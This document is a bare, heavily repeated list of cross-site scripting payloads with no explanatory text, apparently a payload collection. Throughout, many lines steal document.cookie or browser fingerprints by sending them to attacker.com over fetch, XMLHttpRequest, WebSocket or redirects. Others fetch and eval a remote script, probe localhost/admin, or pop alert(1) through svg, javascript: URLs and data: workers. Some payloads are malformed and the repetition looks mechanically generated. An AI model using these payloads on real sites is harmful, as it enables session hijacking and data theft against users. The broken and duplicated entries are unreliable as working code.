<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
